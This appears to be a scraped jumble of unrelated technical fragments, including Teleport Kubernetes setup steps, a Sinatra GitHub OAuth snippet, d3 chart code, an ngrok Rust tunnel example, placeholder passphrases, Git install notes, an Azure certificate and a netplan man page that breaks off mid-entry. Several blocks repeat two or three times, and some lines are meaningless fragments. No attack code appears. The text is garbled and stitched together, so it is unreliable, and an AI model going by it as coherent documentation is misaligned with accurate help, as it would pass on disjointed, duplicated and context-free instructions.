"view" is a default ClusterRole that grants read-only access to resources

See: https://kubernetes.io/docs/reference/access-authn-authz/rbac/#user-facing-roles

name: view apiGroup: rbac.authorization.k8s.io
$ kubectl apply -f viewers-bind.yaml Log out of Teleport and log in again.

Step 4/4. Access your Kubernetes cluster After Teleport starts with the above config, you should be able to see all new clusters:

tsh kube ls Kube Cluster Name Labels Selected

my-cluster region=us-east-1 To access your cluster, run the following command, replacing my-cluster with the name of the cluster you would like to access:

tsh kube login my-cluster Logged into kubernetes cluster "my-cluster". Try 'kubectl version' to test the connection.

make -C build.assets build-binaries

git clone https://github.com/gravitational/teleport.git cd teleport

make full

make build/tsh TOUCHID=yes

make build/tsh FIDO2=dynamic

export PKG_CONFIG_PATH="$(brew --prefix openssl@3)/lib/pkgconfig" make build/tsh FIDO2=dynamic

sudo mkdir -p -m0700 /var/lib/teleport sudo chown $USER /var/lib/teleport
file; 2:blue attack one;3:blue attack Mul;4:check
				
                one;5:check Mul)

CLIENT_ID = ENV['GH_GRAPH_CLIENT_ID']
CLIENT_SECRET = ENV['GH_GRAPH_SECRET_ID']

enable :sessions

set :github_options, {
  :scopes    => "repo",
  :secret    => CLIENT_SECRET,
  :client_id => CLIENT_ID,
  :callback_url => "/"
}

register Sinatra::Auth::Github

get '/' do
  if !authenticated?
    authenticate!
  else
    access_token = github_user["token"]
  end
end

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

CLIENT_ID = ENV['GH_GRAPH_CLIENT_ID']
CLIENT_SECRET = ENV['GH_GRAPH_SECRET_ID']

enable :sessions

set :github_options, {
  :scopes    => "repo",
  :secret    => CLIENT_SECRET,
  :client_id => CLIENT_ID,
  :callback_url => "/"
}

register Sinatra::Auth::Github

get '/' do
  if !authenticated?
    authenticate!
  else
    access_token = github_user["token"]
  end
end

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

let tun = ngrok::Session::builder()
    // Read the token from the NGROK_AUTHTOKEN environment variable
    .authtoken_from_env()
    // Connect the ngrok session
    .connect()
    .await?
    // Start a tunnel with an HTTP edge
    .http_endpoint()
    .listen()
    .await?;

println!("Tunnel started on URL: {:?}", tun.url());

// Instead of binding a local port like so:
// axum::Server::bind(&"0.0.0.0:8000".parse().unwrap())
// Run it with an ngrok tunnel instead!
axum::Server::builder(tun)
    .serve(app.into_make_service_with_connect_info::<SocketAddr>())
    .await
    .unwrap();

Ok(())

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"

0 = key does not expire

let tun = ngrok::Session::builder()
    // Read the token from the NGROK_AUTHTOKEN environment variable
    .authtoken_from_env()
    // Connect the ngrok session
    .connect()
    .await?
    // Start a tunnel with an HTTP edge
    .http_endpoint()
    .listen()
    .await?;

println!("Tunnel started on URL: {:?}", tun.url());

// Instead of binding a local port like so:
// axum::Server::bind(&"0.0.0.0:8000".parse().unwrap())
// Run it with an ngrok tunnel instead!
axum::Server::builder(tun)
    .serve(app.into_make_service_with_connect_info::<SocketAddr>())
    .await
    .unwrap();

Ok(())

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"

          GNU LESSER GENERAL PUBLIC LICENSE

              Version 3, 29 June 2007

Git installation

	Git installation

$ make prefix=/usr all doc info ;# as yourself
# make prefix=/usr install install-doc install-html install-info ;# as root

$ make configure ;# as yourself
$ ./configure --prefix=/usr ;# as yourself
$ make all doc ;# as yourself
# make install install-doc install-html;# as root

$ make prefix=/usr profile
# make prefix=/usr PROFILE=BUILD install

$ make prefix=/usr profile-fast
# make prefix=/usr PROFILE=BUILD install

$ make profile-install

prefix=/usr perllibdir=/usr/$(/usr/bin/perl -MConfig -wle 'print substr $Config{installsitelib}, 1 + length $Config{siteprefixexp}')


Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples

`@` > `+` > `/` > `,`

layout = "LOCAL,BASE,REMOTE / MERGED"

${{ fa94d7e31ab6bfd9f3c06686aec51c9f63cd3c3f}}
env: # Or as an environment variable
super_secret: $

  # GitHub CLI api

`@` > `+` > `/` > `,`

layout = "LOCAL,BASE,REMOTE / MERGED"

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"

${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
passphrase: $

           |                     |    ^

          (1)                   (3)  (4)

           V                     v    |

      +----------------------------------+

      |        Language Team XX          |


      +----------------------------------+

      "msgcat --no-location -"


      "msgcat --add-location=file -"

 _(reset_type_names[reset_type]));


	Git installation


          GNU LESSER GENERAL PUBLIC LICENSE

              Version 3, 29 June 2007

$VALID_NAME... ";
+# compare if name found
+NAME=$

Git installation

$ make configure ;# as yourself
$ ./configure --prefix=/usr ;# as yourself
$ make all doc ;# as yourself
# make install install-doc install-html;# as root

$ make prefix=/usr profile
# make prefix=/usr PROFILE=BUILD install

$ make prefix=/usr profile-fast
# make prefix=/usr PROFILE=BUILD install


$ make profile-install


Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples

`@` > `+` > `/` > `,`


layout = "LOCAL,BASE,REMOTE / MERGED"

  Microsoft Azure Certificate
  
  --header--<X509Certificate>MIIDPjCCAabcAwIBAgIQsRiM0jheFZhKk49YD0SK1TAJBgUrDgMCHQUAMC0xKzApBgNVBAMTImFjY291bnRzLmFjY2Vzc2NvbnRyb2wud2luZG93cy5uZXQwHhcNMTQwMTAxMDcwMDAwWhcNMTYwMTAxMDcwMDAwWjAtMSswKQYDVQQDEyJhY2NvdW50cy5hY2Nlc3Njb250cm9sLndpbmRvd3MubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkSCWg6q9iYxvJE2NIhSyOiKvqoWCO2GFipgH0sTSAs5FalHQosk9ZNTztX0ywS/AHsBeQPqYygfYVJL6/EgzVuwRk5txr9e3n1uml94fLyq/AXbwo9yAduf4dCHTP8CWR1dnDR+Qnz/4PYlWVEuuHHONOw/blbfdMjhY+C/BYM2E3pRxbohBb3x//CfueV7ddz2LYiH3wjz0QS/7kjPiNCsXcNyKQEOTkbHFi3mu0u13SQwNddhcynd/GTgWN8A+6SN1r4hzpjFKFLbZnBt77ACSiYx+IHK4Mp+NaVEi5wQtSsjQtI++XsokxRDqYLwus1I1SihgbV/STTg5enufuwIDAQABo2IwYDBeBgNVHQEEVzBVgBDLebM6bK3BjWGqIBrBNFeNoS8wLTErMCkGA1UEAxMiYWNjb3VudHMuYWNjZXNzY29udHJvbC53aW5kb3dzLm5ldIIQsRiM0jheFZhKk49YD0SK1TAJBgUrDgMCHQUAA4IBAQCJ4JApryF77EKC4zF5bUaBLQHQ1PNtA1uMDbdNVGKCmSp8M65b8h0NwlIjGGGy/unK8P6jWFdm5IlZ0YPTOgzcRZguXDPj7ajyvlVEQ2K2ICvTYiRQqrOhEhZMSSZsTKXFVwNfW6ADDkN3bvVOVbtpty+nBY5UqnI7xbcoHLZ4wYD251uj5+lo13YLnsVrmQ16NCBYq2nQFNPuNJw6t3XUbwBHXpF46aLT1/eGf/7Xx6iy8yPJX4DyrpFTutDz882RWofGEO5t4Cw+zZg70dJ/hH/ODYRMorfXEW+8uKmXMKmX2wyxMKvfiPbTy5LmAU8Jvjs2tLg4rOBcXWLAIarZ</X509Certificate>


${{ fa94d7e31ab6bfd9f3c06686aec51c9f63cd3c3f}}
env: # Or as an environment variable
super_secret: $

`@` > `+` > `/` > `,`


layout = "LOCAL,BASE,REMOTE / MERGED"

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"
    -v "$(pwd)/etc-pihole:/etc/pihole:z" \
    -v "$(pwd)/etc-dnsmasq.d:/etc/dnsmasq.d:z" \

network:
    ethernets:
        ens160:
            dhcp4: true
            dhcp4-overrides:
                use-dns: false
            nameservers:
                addresses: [127.0.0.1]
    version: 2


       netplan - YAML network configuration abstraction for various backends

SYNOPSIS

       netplan [ COMMAND | help ]

COMMANDS

       See netplan help for a list of available commands on this system.

DESCRIPTION

   Introduction
       Distribution  installers, cloud instantiation, image builds for particular devices, or any
       other way to deploy an operating system put its desired network  configuration  into  YAML
       configuration file(s).  During early boot, the netplan "network renderer" runs which reads
       /{lib,etc,run}/netplan/*.yaml and writes configuration to /run  to  hand  off  control  of
       devices to the specified networking daemon.

       • Configured  devices get handled by systemd-networkd by default, unless explicitly marked
         as managed by a specific renderer (NetworkManager)

       • Devices not covered by the network config do not get touched at all.

       • Usable in initramfs (few dependencies and fast)

       • No persistent generated config, only original YAML config

       • Parser supports multiple config files to allow  applications  like  libvirt  or  lxd  to
         package  up  expected  network  config (virbr0, lxdbr0), or to change the global default
         policy to use NetworkManager for everything.

       • Retains  the  flexibility  to  change  backends/policy  later  or  adjust  to   removing
         NetworkManager, as generated configuration is ephemeral.

   General structure
       netplan's configuration files use the YAML (http://yaml.org/spec/1.1/current.html) format.
       All  /{lib,etc,run}/netplan/*.yaml  are   considered.    Lexicographically   later   files
       (regardless  of  in  which  directory they are) amend (new mapping keys) or override (same
       mapping keys) previous ones.  A file in /run/netplan completely shadows a file  with  same
       name  in  /etc/netplan,  and a file in either of those directories shadows a file with the
       same name in /lib/netplan.

       The top-level node in a netplan configuration file is a  network:  mapping  that  contains
       version: 2  (the  YAML currently being used by curtin, MaaS, etc.  is version 1), and then
       device definitions grouped  by  their  type,  such  as  ethernets:,  modems:,  wifis:,  or
       bridges:.   These  are the types that our renderer can understand and are supported by our
       backends.

       Each type block contains device definitions as a map where the keys (called "configuration
       IDs") are defined as below.

   Device configuration IDs
       The  key  names  below  the  per-device-type  definition maps (like ethernets:) are called
       "ID"s.  They must be unique throughout the  entire  set  of  configuration  files.   Their
       primary  purpose  is  to  serve  as  anchor  names  for  composite devices, for example to
       enumerate the members of a bridge that is currently being defined.

       If an interface is defined with an ID in a configuration file; it will be  brought  up  by
       the  applicable  renderer.   To  not  have netplan touch an interface at all, it should be
       completely omitted from the netplan configuration files.

       There are two physically/structurally different classes of device definitions, and the  ID
       field has a different interpretation for each:

       Physical devices
              (Examples: ethernet, modem, wifi) These can dynamically come and go between reboots
              and even during runtime (hotplugging).  In the generic case, they can  be  selected
              by  match:  rules  on  desired  properties, such as name/name pattern, MAC address,
              driver, or device paths.  In general these will match any number of devices (unless
              they refer to properties which are unique such as the full path or MAC address), so
              without further knowledge about the hardware these will always be considered  as  a
              group.

              It  is valid to specify no match rules at all, in which case the ID field is simply
              the interface name to be matched.  This is mostly useful if you want to keep simple
              cases  simple,  and  it's how network device configuration has been done for a long
              time.

              If there are match: rules, then the ID field is a purely opaque name which is  only
              being used for references from definitions of compound devices in the config.

       Virtual devices
              (Examples:  veth,  bridge,  bond)  These  are fully under the control of the config
              file(s) and the network stack.  I.  e.  these devices are being created instead  of
              matched.   Thus match: and set-name: are not applicable for these, and the ID field
              is the name of the created virtual device.

   Common properties for physical device types
       match (mapping)
              This selects a subset of available physical devices by various hardware properties.
              The  following  configuration  will  then apply to all matching devices, as soon as
              they appear.  All specified properties must match.

              name (scalar)
                     Current interface name.  Globs are supported, and the primary use  case  for
                     matching  on  names, as selecting one fixed name can be more easily achieved
                     with having no match: at all and just using the ID (see above).   Note  that
                     currently only networkd supports globbing, NetworkManager does not.

              macaddress (scalar)
                     Device's  MAC  address  in  the  form  "XX:XX:XX:XX:XX:XX".   Globs  are not
                     allowed.

              driver (scalar)
                     Kernel driver name, corresponding to the DRIVER udev  property.   Globs  are
                     supported.  Matching on driver is only supported with networkd.

              Examples:

              • all cards on second PCI bus:

                       match:
                         name: enp2*

              • fixed MAC address:

                       match:
                         macaddress: 11:22:33:AA:BB:FF

              • first card of driver ixgbe:

                       match:
                         driver: ixgbe
                         name: en*s0

       set-name (scalar)
              When  matching  on  unique  properties  such  as  path  or  MAC, or with additional
              assumptions such as "there will only ever be one wifi device", match rules  can  be
              written so that they only match one device.  Then this property can be used to give
              that device a more specific/desirable/nicer  name  than  the  default  from  udev's
              ifnames.   Any  additional  device that satisfies the match rules will then fail to
              get renamed and keep the original kernel name (and dmesg will show an error).

       wakeonlan (bool)
              Enable wake on LAN.  Off by default.

       emit-lldp (bool)
              (networkd backend only) Whether to emit LLDP packets.  Off by default.

   Common properties for all device types
       renderer (scalar)
              Use the given networking backend for  this  definition.   Currently  supported  are
              networkd and NetworkManager.  This property can be specified globally in networks:,
              for a device type (in e.  g.  ethernets:) or for a  particular  device  definition.
              Default is networkd.

              The  renderer property has one additional acceptable value for vlan objects (i.  e.
              defined in vlans:): sriov.  If a vlan is defined with the  sriov  renderer  for  an
              SR-IOV  Virtual  Function  interface, this causes netplan to set up a hardware VLAN
              filter for it.  There can be only one defined per VF.

       dhcp4 (bool)
              Enable DHCP for IPv4.  Off by default.

       dhcp6 (bool)
              Enable DHCP for IPv6.  Off by default.  This covers both stateless DHCP - where the
              DHCP  server supplies information like DNS nameservers but not the IP address - and
              stateful  DHCP,  where  the  server  provides  both  the  address  and  the   other
              information.

              If  you are in an IPv6-only environment with completely stateless autoconfiguration
              (SLAAC with RDNSS), this option can be set to cause the interface to be brought up.
              (Setting  accept-ra  alone  is not sufficient.) Autoconfiguration will still honour
              the contents of the router advertisement and only use DHCP if requested in the RA.

              Note that rdnssd(8) is required to use RDNSS with networkd.  No extra  software  is
              required for NetworkManager.

       ipv6-mtu (scalar)
              Set  the IPv6 MTU (only supported with networkd backend).  Note that needing to set
              this is an unusual requirement.

              Requires feature: ipv6-mtu

       ipv6-privacy (bool)
              Enable IPv6 Privacy Extensions (RFC 4941) for the specified interface,  and  prefer
              temporary  addresses.   Defaults  to  false  -  no  privacy  extensions.   There is
              currently no way to have a private address but prefer the public address.

       link-local (sequence of scalars)
              Configure the link-local addresses to bring  up.   Valid  options  are  'ipv4'  and
              'ipv6',  which respectively allow enabling IPv4 and IPv6 link local addressing.  If
              this field is not defined, the default is to enable only IPv6 link-local addresses.
              If  the  field is defined but configured as an empty set, IPv6 link-local addresses
              are disabled as well as IPv4 link- local addresses.

              This feature enables or disables link-local  addresses  for  a  protocol,  but  the
              actual  implementation differs per backend.  On networkd, this directly changes the
              behavior  and  may  add  an  extra  address  on  an  interface.   When  using   the
              NetworkManager backend, enabling link-local has no effect if the interface also has
              DHCP enabled.

              Example to enable only IPv4 link-local: link-local: [ ipv4 ] Example to enable  all
              link-local  addresses: link-local: [ ipv4, ipv6 ] Example to disable all link-local
              addresses: link-local: [ ]

       critical (bool)
              (networkd backend only) Designate the  connection  as  "critical  to  the  system",
              meaning  that  special  care  will  be taken by systemd-networkd to not release the
              assigned IP when the daemon is restarted.

       dhcp-identifier (scalar)
              When set to 'mac'; pass that setting over to systemd-networkd to use  the  device's
              MAC address as a unique identifier rather than a RFC4361-compliant Client ID.  This
              has no effect when NetworkManager is used as a renderer.

       dhcp4-overrides (mapping)
              (networkd backend only) Overrides default DHCP  behavior;  see  the  DHCP Overrides
              section below.

       dhcp6-overrides (mapping)
              (networkd  backend  only)  Overrides  default DHCP behavior; see the DHCP Overrides
              section below.

       accept-ra (bool)
              Accept Router Advertisement that would have the kernel configure  IPv6  by  itself.
              When  enabled,  accept  Router  Advertisements.   When  disabled, do not respond to
              Router Advertisements.  If unset use the host kernel default setting.

       addresses (sequence of scalars)
              Add static addresses to the interface in addition to the ones received through DHCP
              or   RA.    Each  sequence  entry  is  in  CIDR  notation,  i.   e.   of  the  form
              addr/prefixlen.  addr is an IPv4 or IPv6 address as recognized by inet_pton(3)  and
              prefixlen the number of bits of the subnet.

              For  virtual  devices  (bridges, bonds, vlan) if there is no address configured and
              DHCP is disabled, the interface may still  be  brought  online,  but  will  not  be
              addressable from the network.

              Example: addresses: [192.168.14.2/24, "2001:1::1/64"]

       ipv6-address-generation (scalar)
              Configure  method  for  creating  the  address  for use with RFC4862 IPv6 Stateless
              Address Autoconfiguration.  Possible values are eui64 or stable-privacy.

       gateway4, gateway6 (scalar)
              Set default gateway for IPv4/6, for manual address  configuration.   This  requires
              setting addresses too.  Gateway IPs must be in a form recognized by inet_pton(3).

              Example for IPv4: gateway4: 172.16.0.1 Example for IPv6: gateway6: "2001:4::1"

       nameservers (mapping)
              Set  DNS  servers  and search domains, for manual address configuration.  There are
              two supported fields: addresses: is a list of IPv4 or  IPv6  addresses  similar  to
              gateway*, and search: is a list of search domains.

              Example:

                     ethernets:
                       id0:
                         [...]
                         nameservers:
                           search: [lab, home]
                           addresses: [8.8.8.8, "FEDC::1"]

       macaddress (scalar)
              Set   the   device's   MAC   address.    The  MAC  address  must  be  in  the  form
              "XX:XX:XX:XX:XX:XX".

              Note: This will not work reliably for devices matched by name only and rendered  by
              networkd,  due  to interactions with device renaming in udev.  Match devices by MAC
              when setting MAC addresses.

              Example:

                     ethernets:
                       id0:
                         match:
                           macaddress: 52:54:00:6b:3c:58
                         [...]
                         macaddress: 52:54:00:6b:3c:59

       mtu (scalar)
              Set the Maximum Transmission Unit for the interface.  The default is  1500.   Valid
              values depend on your network interface.

              Note:  This will not work reliably for devices matched by name only and rendered by
              networkd, due to interactions with device renaming in udev.  Match devices  by  MAC
              when setting MTU.

       optional (bool)
              An  optional device is not required for booting.  Normally, networkd will wait some
              time for device to become configured before proceeding with booting.  However, if a
              device  is  marked  as  optional,  networkd  will  not  wait  for it.  This is only
              supported by networkd, and the default is false.

              Example:

                     ethernets:
                       eth7:
                         # this is plugged into a test network that is often
                         # down - don't wait for it to come up during boot.
                         dhcp4: true
                         optional: true

       optional-addresses (sequence of scalars)
              Specify types of addresses that are not required for  a  device  to  be  considered
              online.   This  changes  the behavior of backends at boot time to avoid waiting for
              addresses that are marked optional, and thus consider  the  interface  as  "usable"
              sooner.  This does not disable these addresses, which will be brought up anyway.

              Example:

                     ethernets:
                       eth7:
                         dhcp4: true
                         dhcp6: true
                         optional-addresses: [ ipv4-ll, dhcp6 ]

       routes (mapping)
              Configure static routing for the device; see the Routing section below.

       routing-policy (mapping)
              Configure policy routing for the device; see the Routing section below.

   DHCP Overrides
       Several  DHCP  behavior overrides are available.  Most currently only have any effect when
       using the networkd backend, with the exception of use-routes and route-metric.

       Overrides only have an effect if the corresponding dhcp4 or dhcp6 is set to true.

       If both dhcp4 and dhcp6 are true, the networkd backend requires that  dhcp4-overrides  and
       dhcp6-overrides  contain  the  same keys and values.  If the values do not match, an error
       will be shown and the network configuration will not be applied.

       When  using  the  NetworkManager  backend,  different  values   may   be   specified   for
       dhcp4-overrides  and  dhcp6-overrides, and will be applied to the DHCP client processes as
       specified in the netplan YAML.

       : The dhcp4-overrides and dhcp6-overrides mappings override the default DHCP behavior.

               ``use-dns`` (bool)
               :    Default: ``true``. When ``true``, the DNS servers received from the
                    DHCP server will be used and take precedence over any statically
                    configured ones. Currently only has an effect on the ``networkd``
                    backend.

               ``use-ntp`` (bool)
               :    Default: ``true``. When ``true``, the NTP servers received from the
                    DHCP server will be used by systemd-timesyncd and take precedence
                    over any statically configured ones. Currently only has an effect on
                    the ``networkd`` backend.

               ``send-hostname`` (bool)
               :    Default: ``true``. When ``true``, the machine's hostname will be sent
                    to the DHCP server. Currently only has an effect on the ``networkd``
                    backend.

               ``use-hostname`` (bool)
               :    Default: ``true``. When ``true``, the hostname received from the DHCP
                    server will be set as the transient hostname of the system. Currently
                    only has an effect on the ``networkd`` backend.

               ``use-mtu`` (bool)
               :    Default: ``true``. When ``true``, the MTU received from the DHCP
                    server will be set as the MTU of the network interface. When ``false``,
                    the MTU advertised by the DHCP server will be ignored. Currently only
                    has an effect on the ``networkd`` backend.

               ``hostname`` (scalar)
               :    Use this value for the hostname which is sent to the DHCP server,
                    instead of machine's hostname. Currently only has an effect on the
                    ``networkd`` backend.

               ``use-routes`` (bool)
               :    Default: ``true``. When ``true``, the routes received from the DHCP
                    server will be installed in the routing table normally. When set to
                    ``false``, routes from the DHCP server will be ignored: in this case,
                    the user is responsible for adding static routes if necessary for
                    correct network operation. This allows users to avoid installing a
                    default gateway for interfaces configured via DHCP. Available for
                    both the ``networkd`` and ``NetworkManager`` backends.

               ``route-metric`` (scalar)
               :    Use this value for default metric for automatically-added routes.
                    Use this to prioritize routes for devices by setting a higher metric
                    on a preferred interface. Available for both the ``networkd`` and
                    ``NetworkManager`` backends.

               ``use-domains`` (scalar)
               :    Takes a boolean, or the special value "route". When true, the domain
                    name received from the DHCP server will be used as DNS search domain
                    over this link, similar to the effect of the Domains= setting. If set
                    to "route", the domain name received from the DHCP server will be
                    used for routing DNS queries only, but not for searching, similar to
                    the effect of the Domains= setting when the argument is prefixed with
                    "~".

                    **Requires feature: dhcp-use-domains**

   Routing
       Complex routing is possible with netplan.   Standard  static  routes  as  well  as  policy
       routing using routing tables are supported via the networkd backend.

       These options are available for all types of interfaces.

       routes (mapping)
              The  routes block defines standard static routes for an interface.  At least to and
              via must be specified.

              For from, to, and via, both IPv4 and IPv6 addresses are recognized, and must be  in
              the form addr/prefixlen or addr.

              from (scalar)
                     Set a source IP address for traffic going through the route.

              to (scalar)
                     Destination address for the route.

              via (scalar)
                     Address to the gateway to use for this route.

              on-link (bool)
                     When  set  to  "true", specifies that the route is directly connected to the
                     interface.

              metric (scalar)
                     The relative priority of the route.  Must be a positive integer value.

              type (scalar)
                     The type of route.  Valid options are  "unicast"  (default),  "unreachable",
                     "blackhole" or "prohibit".

              scope (scalar)
                     The route scope, how wide-ranging it is to the network.  Possible values are
                     "global", "link", or "host".

              table (scalar)
                     The table number to use for the route.  In some scenarios, it may be  useful
                     to  set routes in a separate routing table.  It may also be used to refer to
                     routing policy rules which also accept a table  parameter.   Allowed  values
                     are  positive  integers  starting from 1.  Some values are already in use to
                     refer to specific routing tables: see /etc/iproute2/rt_tables.

       routing-policy (mapping)
              The routing-policy block defines extra routing policy for a network, where  traffic
              may be handled specially based on the source IP, firewall marking, etc.

              For  from, to, both IPv4 and IPv6 addresses are recognized, and must be in the form
              addr/prefixlen or addr.

              from (scalar)
                     Set a source IP address to match traffic for this policy rule.

              to (scalar)
                     Match on traffic going to the specified destination.

              table (scalar)
                     The table number to match for the route.   In  some  scenarios,  it  may  be
                     useful  to  set  routes in a separate routing table.  It may also be used to
                     refer to routes which also accept a table  parameter.   Allowed  values  are
                     positive  integers starting from 1.  Some values are already in use to refer
                     to specific routing tables: see /etc/iproute2/rt_tables.

              priority (scalar)
                     Specify a priority for the routing policy rule, to influence  the  order  in
                     which  routing  rules  are processed.  A higher number means lower priority:
                     rules are processed in order by increasing priority number.

              mark (scalar)
                     Have this routing policy rule match on traffic that has been marked  by  the
                     iptables  firewall  with  this  value.  Allowed values are positive integers
                     starting from 1.

              type-of-service (scalar)
                     Match this policy rule based on the type of service number  applied  to  the
                     traffic.

   Authentication
       Netplan  supports  advanced  authentication  settings for ethernet and wifi interfaces, as
       well as individual wifi networks, by means of the auth block.

       auth (mapping)
              Specifies  authentication  settings  for  a  device  of  type  ethernets:,  or   an
              access-points: entry on a wifis: device.

              The auth block supports the following properties:

              key-management (scalar)
                     The  supported  key  management modes are none (no key management); psk (WPA
                     with pre-shared key, common for home wifi); eap (WPA with  EAP,  common  for
                     enterprise   wifi);   and   802.1x   (used   primarily  for  wired  Ethernet
                     connections).

              password (scalar)
                     The password string for EAP, or the pre-shared key for WPA-PSK.

              The following properties can be used if key-management is eap or 802.1x:

              method (scalar)
                     The EAP method to use.  The  supported  EAP  methods  are  tls  (TLS),  peap
                     (Protected EAP), and ttls (Tunneled TLS).

              identity (scalar)
                     The identity to use for EAP.

              anonymous-identity (scalar)
                     The  identity  to pass over the unencrypted channel if the chosen EAP method
                     supports passing a different tunnelled identity.

              ca-certificate (scalar)
                     Path to  a  file  with  one  or  more  trusted  certificate  authority  (CA)
                     certificates.

              client-certificate (scalar)
                     Path  to  a  file containing the certificate to be used by the client during
                     authentication.

              client-key (scalar)
                     Path   to   a   file   containing   the   private   key   corresponding   to
                     client-certificate.

              client-key-password (scalar)
                     Password  to use to decrypt the private key specified in client-key if it is
                     encrypted.

              phase2-auth (scalar)
                     Phase 2 authentication mechanism.

   Properties for device type ethernets:
       Ethernet device definitions,  beyond  common  ones  described  above,  also  support  some
       additional properties that can be used for SR-IOV devices.

       link (scalar)
              (SR-IOV  devices  only) The link property declares the device as a Virtual Function
